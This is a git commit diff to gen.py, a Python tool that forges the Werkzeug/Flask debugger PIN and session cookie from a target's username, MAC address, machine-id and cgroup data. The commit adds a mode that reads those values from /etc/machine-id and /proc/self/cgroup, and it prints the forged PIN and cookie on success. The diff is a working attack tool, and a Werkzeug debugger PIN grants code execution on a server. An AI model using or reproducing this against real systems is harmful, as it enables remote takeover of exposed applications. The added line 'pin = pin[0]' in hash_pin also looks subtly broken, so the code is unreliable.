a17998d8621013e73697e9f104c1df2a465c40d6
SidneyJob <sidneyjob13@gmail.com>
2023-04-29 15:45:58 +0300

    Edit code, license, readme

--- gen.py
+++ gen.py
@@ -1,10 +1,39 @@
+# MIT License
+
+# Copyright (c) 2023 SidneyJob
+
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+
+
 import hashlib
 from itertools import chain
 import time
 import argparse
+import getpass
+import uuid
+import sys
+
 
 def hash_pin(pin: str) -> str:
+    pin = pin[0]
     return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]
+
 
 def gen_pin(username, mac, mch_id,path,modname,appname):
     probably_public_bits = [username,modname,appname,path]
@@ -49,14 +78,29 @@ def generate_cookie(pin):
     return cookie
 
 
-
 def main():
+    if sys.argv[1] == "GET":
+        with open('/etc/machine-id','r') as f:
+            mch_id = f.readline()[:-1]
+        with open("/proc/self/cgroup",'r') as f:
+            cgroup = f.readline()[:-1]
+        print(f"""  
+Public bits:
+username         === {getpass.getuser()}
+
+Private bits:
+MAC              === {str(uuid.getnode())}
+machine_id       === {mch_id}
+cgroup           === {cgroup}
+""")
+        exit(0)
+
     parser = argparse.ArgumentParser(description="Werkzeug generate PIN script")
 
-    parser.add_argument("--username", dest="username", type=str, help="The username of the user who launched the application\nRead /etc/passwd or /proc/self/cgroup", default='www-data') # www-data
+    parser.add_argument("--username", dest="username", type=str, help="The username of the user who launched the application. Try to read /etc/passwd or /proc/self/cgroup", default='www-data') # www-data
     parser.add_argument("--path", dest="path",required=True, type=str, help="Path to Flask")   # REQUIRED
-    parser.add_argument("--modname", dest="modname", type=str, help="Modname",default='flask.app') # flask.app
-    parser.add_argument("--appname", dest="appname", type=str, help="Appname",default='Flask') # Flask
+    parser.add_argument("--modname", dest="modname", type=str, help="Modname (Default: flask.app)",default='flask.app') # flask.app
+    parser.add_argument("--appname", dest="appname", type=str, help="Appname (Default: Flask)",default='Flask') # Flask
 
 
     parser.add_argument("--mac", dest="mac", required=True, type=str, help="MAC address any interface") # REQUIRED
@@ -64,24 +108,23 @@ def main():
     parser.add_argument("--cgroup", dest="cgroup",required=True, type=str, help="Enter /proc/self/cgroup") # REQUIRED
     
     args = parser.parse_args()
-    
-    
+
 
     mch_id = b""
     mch_id += args.mch_id.encode("UTF-8")
     cgroup_file = args.cgroup.strip().rpartition("/")[2].encode("UTF-8")
     mch_id += cgroup_file
     
-    
-    
-   
     mac = int("".join(args.mac.split(":")),16)
     res = gen_pin(args.username, mac, mch_id, args.path, args.modname, args.appname)
+    
     cookie = generate_cookie(res[0])
     
     if res[0] != '' and res[1] != '':
-        print("[+] SUCCESS!")
-        print(f'PIN: {res[0]}\nCookie: {res[1]}={cookie}')
+        print("\n[+] SUCCESS!")
+        print(f'[*] PIN: {res[0]}\n[*] Cookie: {res[1]}={cookie}')
+    else:
+        print("[-] Error!")
 
 
 if __name__ == "__main__":
